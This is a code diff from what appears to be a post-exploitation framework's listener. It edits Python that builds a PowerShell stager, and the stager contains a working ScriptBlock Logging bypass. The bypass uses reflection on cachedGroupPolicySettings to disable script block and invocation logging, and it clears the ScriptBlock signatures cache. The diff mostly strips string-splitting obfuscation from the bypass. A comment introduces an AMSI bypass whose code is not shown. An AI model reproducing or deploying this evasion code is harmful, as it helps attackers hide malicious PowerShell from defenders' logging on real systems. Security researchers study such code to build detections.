@@ -280,23 +280,23 @@ class Listener:
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetField(")
+                    stager += "'cachedGroupPolicySettings','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
+                    stager += "['ScriptBlockLogging']"
                     stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += "['ScriptBlockLogging']['EnableScriptBlockLogging']=0;"
                     stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += "['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0}"
                     stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += "('EnableScriptBlockLogging',0);"
                     stager += helpers.randomize_capitalization("$val.Add")
                     stager += "('EnableScriptBlockInvocationLogging',0);"
                     stager += helpers.randomize_capitalization("$GPC")
                     stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                     stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].GetField(")
+                    stager += "'signatures','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
